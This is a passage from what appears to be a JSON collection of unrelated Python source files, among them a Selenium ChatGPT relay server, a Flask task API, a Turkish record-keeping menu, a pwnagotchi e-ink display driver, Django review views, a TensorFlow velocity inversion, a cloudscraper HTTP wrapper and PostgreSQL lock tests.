browser.save_screenshot(\"tela_antes_da_resposta.png\")\n            submit_button.click()\n            print(\"aguardando resposta\")\n            # Aguarda a resposta do ChatGPT\n            time.sleep(4)  # Espera 5 segundos para a resposta ser gerada\n            browser.save_screenshot(\"tela_depois_da_resposta.png\")\n            # Obt\u00e9m a resposta\n            response = browser.find_element(By.XPATH ,'//div[@data-message-author-role=\"assistant\"]').text\n            return response\n    except NoSuchElementException:\n        print(\"Elemento n\u00e3o encontrado na p\u00e1gina.\")   \n    \n\nclass RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        post_params = parse_qs(post_data.decode('utf-8'))\n\n        if 'question' in post_params:\n            question = post_params['question'][0]\n            response = ask_gpt(question)  # Suponha que get_gpt_response seja sua fun\u00e7\u00e3o para interagir com o ChatGPT\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps({'response': response}).encode())\n        else:\n            self.send_response(400)\n            self.end_headers()\n            self.wfile.write(b'Bad Request')\n\ndef run(server_class=HTTPServer, handler_class=RequestHandler, port=8000):\n    server_address = ('', port)\n    httpd = server_class(server_address, handler_class)\n    print(f'Starting server on port {port}...')\n    httpd.serve_forever()\n    \n    \n    \n    \n\nif __name__ == \"__main__\":\n    run()\n\n\n\n\n",
    "from flask import Flask,request\nimport json\nimport tasks_db\n\napp = Flask(__name__)\n\n# get all tasks\n# curl http://127.0.0.1:5000/tasks\n@app.route(\"/tasks\", methods=[\"GET\"]) \ndef get_all_tasks():\n    all_tasks = tasks_db.get_all_tasks()\n    return json.dumps({'tasks': all_tasks}) \n\n\n# get single task\n# curl http://127.0.0.1:5000/tasks/{task_id}\n@app.route(\"/tasks/<int:task_id>\", methods=[\"GET\"]) \ndef get_single_task(task_id):\n    task = tasks_db.get_single_task(task_id)\n    return json.dumps(task)\n\n\n# add new task\n# curl -X POST -H \"Content-Type: application/json\" -d '{\"title\":\"Add\", \"details\":\"New\"}' http://127.0.0.1:5000/tasks\n@app.route(\"/tasks\", methods=[\"POST\"])  \ndef add_new_task():\n    data = request.json\n    new_task = tasks_db.add_new_task(data)\n    return json.dumps(new_task)\n\n\n# Update existing task\n# curl -X PUT -H \"Content-Type: application/json\" -d '{\"title\":\"Item\", \"details\":\"Updated\"}' http://127.0.0.1:5000/tasks/{task_id}\n@app.route(\"/tasks/<int:task_id>\", methods=[\"PUT\"])  \ndef update_task(task_id):\n    data = request.json\n    updated_task = tasks_db.update_task(task_id, data)\n    if updated_task is not None:\n        return json.dumps(updated_task)\n    else:\n        return json.dumps({'error': 'Task not found'})\n    \n\n#  Delete task\n# curl -X DELETE http://127.0.0.1:5000/tasks/{task_id}\n@app.route(\"/tasks/<int:task_id>\", methods=[\"DELETE\"])  \ndef delete_task(task_id):\n    deleted_task = tasks_db.delete_task(task_id)\n    if deleted_task is not None:\n        return json.dumps({'message': f'Task {task_id} deleted successfully'})\n    else:\n        return json.dumps({'error': 'Task not found'})\n\n\nif __name__ == '__main__':\n    app.run(port=5000)   ",
    "import os\r\n\r\nclass Kisi:\r\n    def __init__(self, isim, soyisim, tc_kimlik):\r\n        self.isim = isim\r\n        self.soyisim = soyisim\r\n        self.tc_kimlik = tc_kimlik\r\n\r\n    @staticmethod\r\n    def bilgileri_listele():\r\n        try:\r\n            with open(\"kisiler.txt\", \"r\") as dosya:\r\n                kisiler = dosya.readlines()\r\n                if kisiler:\r\n                    for kisi in kisiler:\r\n                        print(kisi.strip())\r\n                else:\r\n                    print(\"Hen\u00fcz ki\u015fi eklenmedi.\")\r\n        except FileNotFoundError:\r\n            print(\"Hen\u00fcz ki\u015fi eklenmedi.\")\r\n\r\n    def bilgileri_kaydet(self):\r\n        with open(\"kisiler.txt\", \"a\") as dosya:\r\n            dosya.write(f\"{self.isim},{self.soyisim},{self.tc_kimlik}\\n\")\r\n\r\nclass Satici(Kisi):\r\n    def __init__(self, isim, soyisim, tc_kimlik, maas):\r\n        super().__init__(isim, soyisim, tc_kimlik)\r\n        self.maas = maas\r\n\r\n    @staticmethod\r\n    def bilgileri_listele():\r\n        try:\r\n            with open(\"saticilar.txt\", \"r\") as dosya:\r\n                saticilar = dosya.readlines()\r\n                if saticilar:\r\n                    for satici in saticilar:\r\n                        print(satici.strip())\r\n                else:\r\n                    print(\"Hen\u00fcz sat\u0131c\u0131 eklenmedi.\")\r\n        except FileNotFoundError:\r\n            print(\"Hen\u00fcz sat\u0131c\u0131 eklenmedi.\")\r\n\r\n    def bilgileri_kaydet(self):\r\n        with open(\"saticilar.txt\", \"a\") as dosya:\r\n            dosya.write(f\"{self.isim},{self.soyisim},{self.tc_kimlik},{self.maas}\\n\")\r\n\r\nclass Urun:\r\n    def __init__(self, urun_id, marka, model):\r\n        self.urun_id = urun_id\r\n        self.marka = marka\r\n        self.model = model\r\n\r\n    @staticmethod\r\n    def bilgileri_listele():\r\n        try:\r\n            with open(\"urunler.txt\", \"r\") as dosya:\r\n                urunler = dosya.readlines()\r\n                if urunler:\r\n                    for urun in urunler:\r\n                        print(urun.strip())\r\n                else:\r\n                    print(\"Hen\u00fcz \u00fcr\u00fcn eklenmedi.\")\r\n        except FileNotFoundError:\r\n            print(\"Hen\u00fcz \u00fcr\u00fcn eklenmedi.\")\r\n\r\n    def bilgileri_kaydet(self):\r\n        with open(\"urunler.txt\", \"a\") as dosya:\r\n            dosya.write(f\"{self.urun_id},{self.marka},{self.model}\\n\")\r\n\r\nclass Menu:\r\n    @staticmethod\r\n    def kisi_ekle():\r\n        isim = input(\"\u0130sim: \")\r\n        soyisim = input(\"Soyisim: \")\r\n        tc_kimlik = input(\"TC Kimlik No: \")\r\n        kisi = Kisi(isim, soyisim, tc_kimlik)\r\n        kisi.bilgileri_kaydet()\r\n        print(\"Ki\u015fi ba\u015far\u0131yla eklendi.\")\r\n\r\n    @staticmethod\r\n    def satici_ekle():\r\n        isim = input(\"\u0130sim: \")\r\n        soyisim = input(\"Soyisim: \")\r\n        tc_kimlik = input(\"TC Kimlik No: \")\r\n        maas = input(\"Maa\u015f: \")\r\n        satici = Satici(isim, soyisim, tc_kimlik, maas)\r\n        satici.bilgileri_kaydet()\r\n        print(\"Sat\u0131c\u0131 ba\u015far\u0131yla eklendi.\")\r\n\r\n    @staticmethod\r\n    def urun_ekle():\r\n        urun_id = input(\"\u00dcr\u00fcn ID: \")\r\n        marka = input(\"Marka: \")\r\n        model = input(\"Model: \")\r\n        urun = Urun(urun_id, marka, model)\r\n        urun.bilgileri_kaydet()\r\n        print(\"\u00dcr\u00fcn ba\u015far\u0131yla eklendi.\")\r\n\r\n    @staticmethod\r\n    def menu_goster():\r\n        while True:\r\n            secim = input(\"\\n1. Ki\u015fi Ekle\\n2. Sat\u0131c\u0131 Ekle\\n3. \u00dcr\u00fcn Ekle\\n4. Ki\u015fileri Listele\\n5. Sat\u0131c\u0131lar\u0131 Listele\\n6. \u00dcr\u00fcnleri Listele\\n7. \u00c7\u0131k\u0131\u015f\\nSe\u00e7iminiz: \")\r\n            if secim == \"1\":\r\n                Menu.kisi_ekle()\r\n            elif secim == \"2\":\r\n                Menu.satici_ekle()\r\n            elif secim == \"3\":\r\n                Menu.urun_ekle()\r\n            elif secim == \"4\":\r\n                print(\"\\nKay\u0131tl\u0131 Ki\u015filer:\")\r\n                Kisi.bilgileri_listele()\r\n            elif secim == \"5\":\r\n                print(\"\\nKay\u0131tl\u0131 Sat\u0131c\u0131lar:\")\r\n                Satici.bilgileri_listele()\r\n            elif secim == \"6\":\r\n                print(\"\\nKay\u0131tl\u0131 \u00dcr\u00fcnler:\")\r\n                Urun.bilgileri_listele()\r\n            elif secim == \"7\":\r\n                print(\"\u00c7\u0131k\u0131\u015f yap\u0131l\u0131yor...\")\r\n                break\r\n            else:\r\n                print(\"Ge\u00e7ersiz se\u00e7im.\")\r\n\r\nif __name__ == \"__main__\":\r\n    Menu.menu_goster()\r\n",
    "import logging\n\nimport pwnagotchi.ui.fonts as fonts\nfrom pwnagotchi.ui.hw.base import DisplayImpl\n\n\nclass Inky(DisplayImpl):\n    def __init__(self, config):\n        super(Inky, self).__init__(config, 'inky')\n\n    def layout(self):\n        fonts.setup(10, 8, 10, 28, 25, 9)\n        self._layout['width'] = 250\n        self._layout['height'] = 122\n        self._layout['face'] = (0, 37)\n        self._layout['name'] = (5, 18)\n        self._layout['channel'] = (0, 0)\n        self._layout['aps'] = (30, 0)\n        self._layout['uptime'] = (147, 0)\n        self._layout['line1'] = [0, 12, 212, 12]\n        self._layout['line2'] = [0, 92, 212, 92]\n        self._layout['friend_face'] = (0, 76)\n        self._layout['friend_name'] = (40, 78)\n        self._layout['shakes'] = (0, 93)\n        self._layout['mode'] = (187, 93)\n        self._layout['status'] = {\n            'pos': (102, 18),\n            'font': fonts.status_font(fonts.Small),\n            'max': 20\n        }\n        return self._layout\n\n    def initialize(self):\n        logging.info(\"initializing inky display\")\n\n        if self.config['color'] == 'fastAndFurious':\n            logging.info(\"Initializing Inky in 2-color FAST MODE\")\n            logging.info(\"THIS MAY BE POTENTIALLY DANGEROUS. NO WARRANTY IS PROVIDED\")\n            logging.info(\"USE THIS DISPLAY IN THIS MODE AT YOUR OWN RISK\")\n\n            from pwnagotchi.ui.hw.libs.inkyphat.inkyphatfast import InkyPHATFast\n            self._display = InkyPHATFast('black')\n            self._display.set_border(InkyPHATFast.BLACK)\n        elif self.config['color'] == 'auto':\n            from inky.auto import auto\n            self._display = auto()\n            self._display.set_border(self._display.BLACK)\n            self._layout['width'] = self._display.WIDTH\n            self._layout['height'] = self._display.HEIGHT\n        else:\n            from inky import InkyPHAT\n            self._display = InkyPHAT(self.config['color'])\n            self._display.set_border(InkyPHAT.BLACK)\n\n    def render(self, canvas):\n        if self.config['color'] == 'black' or self.config['color'] == 'fastAndFurious':\n            display_colors = 2\n        else:\n            display_colors = 3\n\n        img_buffer = canvas.convert('RGB').convert('P', palette=1, colors=display_colors)\n        if self.config['color'] == 'red':\n            img_buffer.putpalette([\n                255, 255, 255,  # index 0 is white\n                0, 0, 0,  # index 1 is black\n                255, 0, 0  # index 2 is red\n            ])\n        elif self.config['color'] == 'yellow':\n            img_buffer.putpalette([\n                255, 255, 255,  # index 0 is white\n                0, 0, 0,  # index 1 is black\n                255, 255, 0  # index 2 is yellow\n            ])\n        else:\n            img_buffer.putpalette([\n                255, 255, 255,  # index 0 is white\n                0, 0, 0  # index 1 is black\n            ])\n\n        self._display.set_image(img_buffer)\n        try:\n            self._display.show()\n        except:\n            logging.exception(\"error while rendering on inky\")\n\n    def clear(self):\n        self._display.Clear()\n",
    "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Copyright 2015 Philipp Schillinger\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n###########################################################\n#               WARNING: Generated code!                  #\n#              **************************                 #\n# Manual changes may get lost if file is generated again. #\n# Only code inside the [MANUAL] tags will be kept.        #\n###########################################################\n\n\"\"\"\nDefine Example Behavior.\n\nCreated on Fri Aug 21 2015\n@author: Philipp Schillinger\n\"\"\"\n\n\nfrom flexbe_core import Autonomy\nfrom flexbe_core import Behavior\nfrom flexbe_core import ConcurrencyContainer\nfrom flexbe_core import Logger\nfrom flexbe_core import OperatableStateMachine\nfrom flexbe_core import PriorityContainer\nfrom flexbe_states.log_state import LogState\nfrom flexbe_states.wait_state import WaitState\n\n# Additional imports can be added inside the following tags\n# [MANUAL_IMPORT]\n\n# [/MANUAL_IMPORT]\n\n\nclass ExampleBehaviorSM(Behavior):\n    \"\"\"\n    Define Example Behavior.\n\n    This is a simple example for a behavior.\n    \"\"\"\n\n    def __init__(self, node):\n        super().__init__()\n        self.name = 'Example Behavior'\n\n        # parameters of this behavior\n        self.add_parameter('waiting_time', 3)\n\n        # references to used behaviors\n        OperatableStateMachine.initialize_ros(node)\n        ConcurrencyContainer.initialize_ros(node)\n        PriorityContainer.initialize_ros(node)\n        Logger.initialize(node)\n        LogState.initialize_ros(node)\n        WaitState.initialize_ros(node)\n\n        # Additional initialization code can be added inside the following tags\n        # [MANUAL_INIT]\n\n        # [/MANUAL_INIT]\n\n        # Behavior comments:\n\n    def create(self):\n        log_msg = \"Hello World!\"\n        # x:83 y:390\n        _state_machine = OperatableStateMachine(outcomes=['finished'])\n\n        # Additional creation code can be added inside the following tags\n        # [MANUAL_CREATE]\n\n        # [/MANUAL_CREATE]\n        with _state_machine:\n            # x:52 y:78\n            OperatableStateMachine.add('Print_Message',\n                                       LogState(text=log_msg, severity=Logger.REPORT_HINT),\n                                       transitions={'done': 'Wait_After_Logging'},\n                                       autonomy={'done': Autonomy.Low})\n\n            # x:40 y:228\n            OperatableStateMachine.add('Wait_After_Logging',\n                                       WaitState(wait_time=self.waiting_time),\n                                       transitions={'done': 'finished'},\n                                       autonomy={'done': Autonomy.Off})\n\n        return _state_machine\n\n    # Private functions can be added inside the following tags\n    # [MANUAL_FUNC]\n\n    # [/MANUAL_FUNC]\n",
    "from django.shortcuts import render, redirect\nfrom django.views import View\nfrom django.contrib.auth.models import User\nfrom . import models\nfrom .models import Game, Review\nfrom django.http import JsonResponse\n\ndef getUser(req):\n    user = User.objects.get(username=req.user)\n    context = {\n        \"user\": {\n            \"username\": user.username,\n            \"email\": user.email\n        }\n    }\n    return context\n\nclass RootView(View):\n    def get(self, req):\n        if(req.user.is_authenticated):\n            context = getUser(req)\n            return render(req, 'app/app.html', context)\n        \n        return redirect(\"autenticacao:signin\")\n    \nclass SearchView(View):\n    def get(self, req):\n        if(req.user.is_authenticated):\n            context = getUser(req)\n            \n            searchTerm = req.GET.get(\"search\")\n\n            games = Game.objects.all().filter(name__icontains=searchTerm)\n\n            context[\"games\"] = games\n\n            return render(req, 'app/search.html', context)\n        \n        return redirect(\"autenticacao:signin\")\n\nclass GameView(View):\n    def get(self, req, id):\n        if req.user.is_authenticated:\n            context = getUser(req)\n            try:\n                game = Game.objects.get(pk=id)\n                likes = game.like_set.filter(liked=True)\n                review = game.review_set.filter(user=req.user)\n\n                allReviews = game.review_set.all().exclude(user=req.user)\n\n                context[\"allReviews\"] = allReviews\n\n                if(review.exists()):\n                    context[\"review\"] = review.first()\n\n                \n                context[\"game\"] = game\n\n                try:\n                    context[\"liked\"] = \"liked\" if likes.get(user=req.user).liked else \"\"\n                except:\n                    context[\"liked\"] = False\n\n                context[\"likes\"] = len(likes)\n                \n               \n                try:\n                    user_review = Review.objects.get(user=req.user, game=game)\n                    context[\"user_review\"] = user_review.text\n                except Review.DoesNotExist:\n                    context[\"user_review\"] = None\n                return render(req, 'app/game.html', context)\n            except Exception as e:\n                print(\"An error occurred:\", e)\n                return redirect(\"app:root\")\n        \n        return redirect(\"autenticacao:signin\")\n\n    def post(self, req, id):\n        if req.POST.get(\"action\") == \"submit_review\":\n            return self.criandoReview(req, id)\n        else:\n            return self.like_game(req, id)\n\n    def like_game(self, req, id):\n        if req.user.is_authenticated:\n            try:\n                game = Game.objects.get(pk=id)\n                likes = game.like_set.filter(user=req.user)\n\n                if not likes.exists():\n                    game.like_set.create(user=req.user, liked=True)\n                    game.save()\n                else:\n                    for like in likes:\n                        like.liked = not like.liked\n                        like.save()\n\n                like = game.like_set.get(user=req.user)\n\n                return JsonResponse({\"message\": \"Curtiu\" if like.liked else \"Deixou de curtir\"})\n            except:\n                return JsonResponse({\"message\": \"Jogo n\u00e3o existe\"}, status=404)\n        else:\n            return JsonResponse({\"message\": \"Voc\u00ea precisa estar logado\"}, status=400)\n\n    def criandoReview(self, req, id):\n        if req.user.is_authenticated:\n            try:\n                game = Game.objects.get(pk=id)\n                review_text = req.POST.get('textoDaReview')\n\n                existing_review = Review.objects.filter(user=req.user, game=game).first()\n\n                if existing_review:\n                    existing_review.text = review_text\n                    existing_review.save()\n                    return redirect(f\"/app/review/{existing_review.id}\")\n                \n                else:\n                    novaReview = Review(user=req.user, game=game, text=review_text)\n                    novaReview.save()\n\n                    return redirect(f\"/app/review/{novaReview.id}\")\n            except Game.DoesNotExist:\n                return JsonResponse({\"message\": \"Jogo n\u00e3o encontrado\"}, status=404)\n            \n        else:\n            return JsonResponse({\"message\": \"Voc\u00ea precisa estar logado\"}, status=400)\n\n\nclass ReviewView(View):\n    def get(self, req, id):\n        if(req.user.is_authenticated):\n            context = getUser(req)\n\n            try:\n                review = Review.objects.get(pk=id)\n                game = review.game\n                print(game);\n\n                context[\"game\"] = game\n                context[\"review\"] = review\n\n                return render(req, \"app/review.html\", context)\n            except:\n                return redirect(\"app:root\")\n            \n        return redirect(\"app:root\")",
    "\"\"\"\n@author: Chao Song\n\"\"\"\n\nimport tensorflow as tf\nimport numpy as np\nimport time\nimport cmath\nimport scipy.io\n\nnp.random.seed(1234)\ntf.set_random_seed(1234)\n\nmisfit = []\nmisfit1 = []\n\ndef fwd_gradients(Y, x):\n    dummy = tf.ones_like(Y)\n    G = tf.gradients(Y, x, grad_ys=dummy, colocate_gradients_with_ops=True)[0]\n    Y_x = tf.gradients(G, dummy, colocate_gradients_with_ops=True)[0]\n    return Y_x\n\n####### Class for velocity inversion\nclass Velocityinversion:\n    # Initialize the class\n    def __init__(self, x, z, u0, du, du_xx, du_zz, m0, layers, omega):\n        \n        X = np.concatenate([x, z], 1)\n        \n        self.lb = X.min(0)\n        self.ub = X.max(0)\n                \n        self.X = X\n\n        self.x = X[:,0:1]\n        self.z = X[:,1:2]\n        \n        self.u0 = u0\n        self.du = du\n        self.du_xx = du_xx\n        self.du_zz = du_zz\n        self.m0 = m0\n\n        self.omega = omega\n        self.layers = layers\n        \n        # Initialize NN\n        self.weights, self.biases = self.initialize_NN(layers)  \n\n        # tf placeholders \n        self.sess = tf.Session(config=tf.ConfigProto(allow_soft_placement=True,\n                                                     log_device_placement=True))\n\n        self.x_tf = tf.placeholder(tf.float32, shape=[None, self.x.shape[1]])\n        self.z_tf = tf.placeholder(tf.float32, shape=[None, self.z.shape[1]])\n\n        self.m_pred, self.f_loss = self.net_NS(self.x_tf, self.z_tf)\n\n        # loss function we define\n       \n        self.loss = tf.reduce_sum(tf.square(tf.abs(self.f_loss)))\n        \n        # optimizer used by default (in original paper)        \n            \n        self.optimizer = tf.contrib.opt.ScipyOptimizerInterface(self.loss, \n                                                                method = 'L-BFGS-B', \n                                                                options = {'maxiter': 50000,\n                                                                           'maxfun': 50000,\n                                                                           'maxcor': 50,\n                                                                           'maxls': 50,\n                                                                           'ftol' : 1.0 * np.finfo(float).eps})        \n        \n        self.optimizer_Adam = tf.train.AdamOptimizer()\n        self.train_op_Adam = self.optimizer_Adam.minimize(self.loss)                    \n        \n        init = tf.global_variables_initializer()\n        self.sess.run(init)\n\n    def initialize_NN(self, layers):        \n        weights = []\n        biases = []\n        num_layers = len(layers) \n        for l in range(0,num_layers-1):\n            W = self.xavier_init(size=[layers[l], layers[l+1]])\n            b = tf.Variable(tf.zeros([1,layers[l+1]], dtype=tf.float32)+0.0, dtype=tf.float32)\n            weights.append(W)\n            biases.append(b)        \n        return weights, biases\n        \n    def xavier_init(self, size):\n        in_dim = size[0]\n        out_dim = size[1]        \n        xavier_stddev = np.sqrt(2/(in_dim + out_dim))\n        return tf.Variable(tf.truncated_normal([in_dim, out_dim], stddev=xavier_stddev), dtype=tf.float32)\n    \n    def neural_net(self, X, weights, biases):\n        num_layers = len(weights) + 1\n        \n        H = 2.0*(X - self.lb)/(self.ub - self.lb) - 1.0\n        for l in range(0,num_layers-2):\n            W = weights[l]\n            b = biases[l]\n        #    H = tf.nn.relu(tf.add(tf.matmul(H, W), b))\n            H = tf.atan(tf.add(tf.matmul(H, W), b))\n        W = weights[-1]\n        b = biases[-1]\n        Y = tf.add(tf.matmul(H, W), b)\n        return Y\n\n    def net_NS(self, x, z):\n\n        omega = self.omega\n        m0 = self.m0\n\n        u0 = self.u0\n        du = self.du\n        du_xx = self.du_xx\n        du_zz = self.du_zz\n      \n        m = self.neural_net(tf.concat([x,z], 1), self.weights, self.biases)\n  \n       # m_x = fwd_gradients(m, x)\n       # m_z = fwd_gradients(m, z)\n\n        #f_loss =  omega*omega*m*du + du_xx + du_zz + omega*omega*(m-m0)*u0 + 0.1*(m_x**2+m_z**2)**0.5 \n        f_loss =  omega*omega*m*du + du_xx + du_zz + omega*omega*(m-m0)*u0 \n\n        return m, f_loss       \n    \n    def callback(self, loss):\n        print('Loss: %.3e' % (loss))      \n        misfit1.append(loss)\n        scipy.io.savemat('misfit1_v.mat',{'misfit1':misfit1})\n\n    def train(self, nIter): \n\n        tf_dict = {self.x_tf: self.x, self.z_tf: self.z}\n        \n        start_time = time.time()\n        for it in range(nIter):\n            self.sess.run(self.train_op_Adam, tf_dict)\n            loss_value = self.sess.run(self.loss, tf_dict)\n            misfit.append(loss_value)         \n            # Print\n            if it % 10 == 0:\n                elapsed = time.time() - start_time\n                loss_value = self.sess.run(self.loss, tf_dict)\n                print('It: %d, Loss: %.3e,Time: %.2f' % \n                      (it, loss_value, elapsed))\n                st",
    "import httpx\r\nimport requests\r\nfrom cloudscraper import create_scraper\r\n\r\nclass CloudFlareScraper:\r\n    def __init__(self, url, **kwargs):\r\n        self.url = url\r\n        self.user_agent = kwargs.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')\r\n        self.timeout = kwargs.get('timeout', 30)\r\n        self.verify = kwargs.get('verify', True)\r\n        self.proxies = kwargs.get('proxies', {})\r\n        self.client = None\r\n        self.scraper = None\r\n\r\n    def __enter__(self):\r\n        try:\r\n            self.client = httpx.Client(timeout=self.timeout, verify=self.verify, proxies=self.proxies, headers={'User-Agent': self.user_agent})\r\n        except Exception as e:\r\n            self.client = None\r\n        \r\n        try:\r\n            self.scraper = create_scraper()\r\n        except Exception as e:\r\n            self.scraper = None\r\n\r\n        if self.client is None and self.scraper is None:\r\n            raise ValueError(\"Neither HTTPX Client nor Cloudscraper is initialized.\")\r\n\r\n        return self\r\n\r\n    def __exit__(self, exc_type, exc_value, traceback):\r\n        if self.client:\r\n            self.client.close()\r\n\r\n    def _send_request(self, method, data=None, **kwargs):\r\n        headers = {'User-Agent': self.user_agent}\r\n        headers.update(kwargs.get('headers', {}))\r\n        \r\n        try:\r\n            if self.client:\r\n                if method == 'GET':\r\n                    response = self.client.get(self.url, headers=headers)\r\n                elif method == 'POST':\r\n                    headers['Content-Type'] = 'application/json'\r\n                    response = self.client.post(self.url, headers=headers, data=data)\r\n                else:\r\n                    raise ValueError(\"Invalid HTTP method specified\")\r\n            elif self.scraper:\r\n                if method == 'GET':\r\n                    response = self.scraper.get(self.url, headers=headers, timeout=self.timeout, proxies=self.proxies)\r\n                elif method == 'POST':\r\n                    response = self.scraper.post(self.url, headers=headers, data=data, timeout=self.timeout, proxies=self.proxies)\r\n                else:\r\n                    raise ValueError(\"Invalid HTTP method specified\")\r\n            else:\r\n                raise ValueError(\"Neither HTTPX Client nor Cloudscraper is initialized.\")\r\n            \r\n            response.raise_for_status()\r\n            return response.text\r\n        except Exception as e:\r\n            raise Exception(f\"Request error occurred: {str(e)}\")\r\n\r\n    def get(self, **kwargs):\r\n        return self._send_request('GET', **kwargs)\r\n\r\n    def post(self, data, **kwargs):\r\n        return self._send_request('POST', data, **kwargs)\r\n",
    "from __future__ import annotations\nfrom contextlib import contextmanager\nfrom dataclasses import dataclass\nimport enum\nimport json\nimport threading\nimport time\n\nfrom typing import Iterator\nimport psycopg\nimport pytest\n\nROOT_URL = \"postgres:///postgres\"\nURL = \"postgres:///pglockpy\"\nSET_UP_SQL = \"\"\"\n    CREATE TABLE t (id INT);\n    CREATE TABLE u (id INT);\n    CREATE MATERIALIZED VIEW mat AS SELECT * FROM t;\n    CREATE INDEX idx ON t (id);\n    CREATE OR REPLACE FUNCTION f() RETURNS TRIGGER AS $$ BEGIN RETURN NEW; END; $$ LANGUAGE plpgsql;\n    ALTER TABLE t ADD CONSTRAINT constr CHECK (id > 0) NOT VALID;\n    CREATE SEQUENCE seq;\n\"\"\"\n\n\n@dataclass\nclass Connections:\n    a: psycopg.Connection\n    b: psycopg.Connection\n    c: psycopg.Connection  # no implicit TRANSACTION\n\n\n@dataclass(frozen=True)\nclass Lock:\n    relation: str\n    lock_kind: LockKind\n\n    @staticmethod\n    def from_mode(relation: str, mode: str) -> Lock:\n        lock_kind = {\n            \"AccessExclusiveLock\": L.ACCESS_EXCLUSIVE,\n            \"ExclusiveLock\": L.EXCLUSIVE,\n            \"ShareRowExclusiveLock\": L.SHARE_ROW_EXCLUSIVE,\n            \"ShareLock\": L.SHARE,\n            \"ShareUpdateExclusiveLock\": L.SHARE_UPDATE_EXCLUSIVE,\n            \"RowExclusiveLock\": L.ROW_EXCLUSIVE,\n            \"RowShareLock\": L.ROW_SHARE,\n            \"AccessShareLock\": L.ACCESS_SHARE,\n        }[mode]\n        return Lock(relation, lock_kind)\n\n\n@pytest.fixture\ndef conns() -> Iterator[Connections]:\n    \"\"\"Whole fresh database with N connections per test.\n\n    Not quick, but simple.\n    \"\"\"\n    try:\n        with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n            conn.execute(\"DROP DATABASE pglockpy\")\n    except Exception:\n        pass\n\n    with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n        conn.execute(\"CREATE DATABASE pglockpy\")\n\n    with (\n        psycopg.connect(URL) as a,\n        psycopg.connect(URL) as b,\n        psycopg.connect(URL, autocommit=True) as c,\n    ):\n        a.execute(SET_UP_SQL)\n        a.commit()\n        yield Connections(a, b, c)\n\n\nclass LockKind(enum.Enum):\n    ACCESS_EXCLUSIVE = \"ACCESS EXCLUSIVE\"\n    EXCLUSIVE = \"EXCLUSIVE\"\n    SHARE_ROW_EXCLUSIVE = \"SHARE ROW EXCLUSIVE\"\n    SHARE = \"SHARE\"\n    SHARE_UPDATE_EXCLUSIVE = \"SHARE UPDATE EXCLUSIVE\"\n    ROW_EXCLUSIVE = \"ROW EXCLUSIVE\"\n    ROW_SHARE = \"ROW SHARE\"\n    ACCESS_SHARE = \"ACCESS SHARE\"\n    # SELECT ... FOR\n    FOR_UPDATE = \"FOR UPDATE\"\n    FOR_NO_KEY_UPDATE = \"FOR NO KEY UPDATE\"\n    FOR_SHARE = \"FOR SHARE\"\n    FOR_KEY_SHARE = \"FOR KEY SHARE\"\n\n\nL = LockKind\n\n\nclass Statement(enum.Enum):\n    DROP_TABLE = \"DROP TABLE t\"\n    TRUNCATE = \"TRUNCATE t\"\n    CREATE_TABLE = \"CREATE TABLE v (id INT)\"\n    ALTER_TABLE = \"ALTER TABLE t ADD COLUMN col INT\"\n    REINDEX = \"REINDEX TABLE t\"\n    VACUUM_FULL = \"VACUUM FULL\"\n    REFERESH_MATERIALIZED_VIEW = \"REFRESH MATERIALIZED VIEW mat\"\n    ALTER_TABLE_FOREIGN_KEY = (\n        \"ALTER TABLE t ADD CONSTRAINT fk FOREIGN KEY (id) REFERENCES u (id)\"\n    )\n    CREATE_TRIGGER = (\n        \"CREATE TRIGGER trig AFTER INSERT ON t FOR EACH ROW EXECUTE FUNCTION f()\"\n    )\n    CREATE_INDEX = \"CREATE INDEX idy ON t (id)\"\n    VACUUM = \"VACUUM\"\n    ANALYZE = \"ANALYZE\"\n    CREATE_INDEX_CONCURRENTLY = \"CREATE INDEX CONCURRENTLY idy ON t (id)\"\n    CREATE_STATISTICS = \"CREATE STATISTICS stat ON id FROM t\"\n    REINDEX_CONCURRENTLY = \"REINDEX TABLE CONCURRENTLY t\"\n    ALTER_TABLE_SET_STATISTICS = \"ALTER TABLE t ALTER COLUMN id SET STATISTICS 100\"\n    ALTER_TABLE_VALIDATE_CONSTRAINT = \"ALTER TABLE t VALIDATE CONSTRAINT constr\"\n    ALTER_INDEX_RENAME = \"ALTER INDEX idx RENAME TO idy\"\n    UPDATE = \"UPDATE t SET id = 4\"\n    DELETE = \"DELETE FROM t\"\n    INSERT = \"INSERT INTO t VALUES (1)\"\n    MERGE = \"MERGE INTO t USING u AS sub ON t.id = u.id WHEN MATCHED THEN DO NOTHING\"\n    SELECT_FOR_UPDATE = \"SELECT * FROM t FOR UPDATE\"\n    SELECT_FOR_NO_KEY_UPDATE = \"SELECT * FROM t FOR NO KEY UPDATE\"\n    SELECT_FOR_SHARE = \"SELECT * FROM t FOR SHARE\"\n    SELECT_FOR_KEY_SHARE = \"SELECT * FROM t FOR KEY SHARE\"\n    SELECT = \"SELECT * FROM t\"\n\n    @property\n    def name_no_underscore(self) -> str:\n        return self.name.replace(\"_\", \" \")\n\n\n@dataclass\nclass LockRelationship:\n    original_lock: LockKind\n    doesnt_block: list[LockKind]\n    blocks: list[LockKind]\n\n\nTABLE_LOCK_RELATIONSHIPS = [\n    LockRelationship(\n        original_lock=L.ACCESS_EXCLUSIVE,\n        doesnt_block=[],\n        blocks=      [L.ACCESS_SHARE, L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.EXCLUSIVE,\n        doesnt_block=[L.ACCESS_SHARE],\n        blocks=      [                L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, 